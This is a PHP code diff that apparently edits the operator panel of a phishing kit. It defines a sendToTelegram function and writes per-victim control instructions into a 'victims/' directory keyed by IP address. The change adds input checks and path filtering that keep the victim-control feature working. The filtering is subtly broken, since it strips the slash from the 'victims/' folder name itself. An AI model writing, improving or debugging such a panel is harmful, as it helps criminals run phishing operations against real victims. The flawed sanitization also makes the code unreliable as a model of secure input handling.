@@ -16,11 +16,24 @@ function sendToTelegram($message) {
 }
 
 // معالجة التحكم
-if ($_POST['step'] == "control") {
-    $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
-    fwrite($fp, $_POST['to']);
-    fclose($fp);
-    header("location: control.php?ip=" . $_POST['ip']);
+if (isset($_POST['step']) && $_POST['step'] == "control") {
+    // Also validate required fields to avoid further warnings
+    if (!isset($_POST['ip']) || !isset($_POST['to'])) {
+        // Handle missing data (optional: redirect with error message)
+        die("Missing required parameters.");
+    }
+    
+    $filepath = 'victims/' . $_POST['ip'] . '.txt';
+    // Optional: basic sanitization to prevent directory traversal
+    $filepath = str_replace(['..', '/', '\\'], '', $filepath);
+    
+    $fp = fopen($filepath, 'wb');
+    if ($fp) {
+        fwrite($fp, $_POST['to']);
+        fclose($fp);
+    }
+    
+    header("location: control.php?ip=" . urlencode($_POST['ip']));
     exit();
 }
 
